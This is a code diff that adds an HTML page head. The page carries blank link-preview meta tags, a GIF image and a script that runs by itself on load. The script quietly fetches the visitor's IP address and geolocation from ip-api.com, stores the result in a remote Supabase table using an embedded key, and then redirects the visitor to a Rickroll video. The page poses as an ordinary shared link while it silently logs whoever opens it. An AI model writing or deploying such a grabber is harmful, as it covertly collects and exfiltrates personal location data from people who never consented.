@@ -1,0 +1,37 @@
+<head>
+    <meta property="og:title" content="" />
+    <meta property="og:description" content="" />
+    <meta property="og:image" content="https://tenor.com/ipSn0SA58pw.gif" />
+    <meta property="og:image:type" content="image/gif" />
+    <meta name="twitter:card" content="summary_large_image" />
+
+    <script type="module">
+        import { createClient } from "https://esm.sh/@supabase/supabase-js";
+
+        const supabase = createClient(
+            "https://miwcmqwhudshgetmrmhf.supabase.co",
+            "sb_publishable_stheDa15dO1UIajFAVSHmw_hKuIf4GZ"
+        );
+
+        async function addUser() {
+            let address = await (await fetch("http://ip-api.com/json")).json();
+
+            const { data, error } = await supabase.from("name").insert([{ user: address }]);
+
+            if (error) {
+                console.error(error);
+                return false;
+            }
+
+            console.log(data);
+            return true;
+        }
+
+        async function main() {
+            await addUser();
+            window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=V7SQFvIfX-yfRHRE";
+        }
+
+        main();
+    </script>
+</head>
